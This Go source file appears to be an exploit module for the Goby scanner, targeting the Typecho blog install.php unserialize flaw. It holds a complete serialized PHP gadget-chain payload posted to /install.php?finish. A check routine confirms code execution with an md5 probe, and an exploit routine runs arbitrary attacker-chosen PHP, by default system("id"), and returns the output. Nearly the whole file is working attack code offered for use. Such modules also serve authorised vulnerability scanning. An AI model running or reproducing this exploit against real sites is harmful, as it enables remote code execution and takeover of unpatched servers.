package exploits

import (
	"crypto/md5"
	"encoding/base64"
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"math/rand"
	"net/url"
	"strconv"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Typecho install.php unserialize RCE",
    "Description": "Typecho is a simple, lightweight blog program. Based on PHP, a variety of databases (Mysql, PostgreSQL, SQLite) are used to store data. The install.php script invoke unserialize function to unserialize user-apply data, that lead to arbitrary code execution.",
    "Product": "Typecho < 1.1(17.10.24)",
    "Homepage": "http://typecho.org/",
    "DisclosureDate": "2017-10-24",
    "Author": "ovi3",
    "FofaQuery": "app=\"typecho-CMS\"",
    "Level": "3",
    "Impact": "Arbitrary code execution",
    "Recommendation": "update Typecho or remove install.php after install",
    "References": [
        "https://github.com/typecho/typecho/issues/619",
        "https://yoga7xm.top/2019/06/01/typecho/"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "phpCode",
            "type": "input",
            "value": "system(\"id\")"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": null,
    "ExploitSteps": null,
    "Tags": [
        "rce"
    ],
    "CVEIDs": null,
    "CVSSScore": "9.3",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10172"
}`

	execCode := func(u *httpclient.FixUrl, phpCode string) (string, error) {
		cfg := httpclient.NewPostRequestConfig("/install.php?finish")
		cfg.Header.Store("Referer", u.FixedHostInfo)
		cfg.Header.Store("Content-Type", "application/x-www-form-urlencoded")

		dataTmpl, _ := url.QueryUnescape(`a%3A2%3A%7Bs%3A7%3A%22adapter%22%3BO%3A12%3A%22Typecho_Feed%22%3A2%3A%7Bs%3A19%3A%22%00Typecho_Feed%00_type%22%3Bs%3A8%3A%22ATOM+1.0%22%3Bs%3A20%3A%22%00Typecho_Feed%00_items%22%3Ba%3A1%3A%7Bi%3A0%3Ba%3A2%3A%7Bs%3A8%3A%22category%22%3Ba%3A1%3A%7Bi%3A0%3BO%3A15%3A%22Typecho_Request%22%3A2%3A%7Bs%3A24%3A%22%00Typecho_Request%00_params%22%3Ba%3A1%3A%7Bs%3A10%3A%22screenName%22%3Bs%3A{{LENGTH}}%3A%22{{CODE}}%22%3B%7Ds%3A24%3A%22%00Typecho_Request%00_filter%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22assert%22%3B%7D%7D%7Ds%3A6%3A%22author%22%3BO%3A15%3A%22Typecho_Request%22%3A2%3A%7Bs%3A24%3A%22%00Typecho_Request%00_params%22%3Ba%3A1%3A%7Bs%3A10%3A%22screenName%22%3Bs%3A{{LENGTH}}%3A%22{{CODE}}%22%3B%7Ds%3A24%3A%22%00Typecho_Request%00_filter%22%3Ba%3A1%3A%7Bi%3A0%3Bs%3A6%3A%22assert%22%3B%7D%7D%7D%7D%7Ds%3A6%3A%22prefix%22%3Bs%3A8%3A%22typecho_%22%3B%7D`)
		data := strings.ReplaceAll(dataTmpl, "{{LENGTH}}", strconv.Itoa(len(phpCode)))
		data = strings.ReplaceAll(data, "{{CODE}}", phpCode)
		data = base64.StdEncoding.EncodeToString([]byte(data))
		cfg.Data = "__typecho_config=" + url.QueryEscape(data)
		resp, err := httpclient.DoHttpRequest(u, cfg)
		if err == nil {
			return resp.RawBody, nil
		}
		return "", err

	}

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			randNum := strconv.Itoa(600000 + rand.Intn(60000))
			content, err := execCode(u, fmt.Sprintf(`print(md5('%s'));`, randNum))
			if err == nil {
				md5Ret := fmt.Sprintf("%x", md5.Sum([]byte(randNum)))
				if strings.Contains(content, md5Ret) {
					return true
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			phpCode := ss.Params["phpCode"].(string)
			content, err := execCode(expResult.HostInfo, phpCode)
			if err == nil {
				expResult.Success = true
				if strings.Contains(content, `typecho-install">`) {
					expResult.Output = strings.TrimSpace(strings.SplitN(content, `typecho-install">`, 2)[1])
				} else {
					expResult.Output = content
				}

			}
			return expResult
		},
	))
}
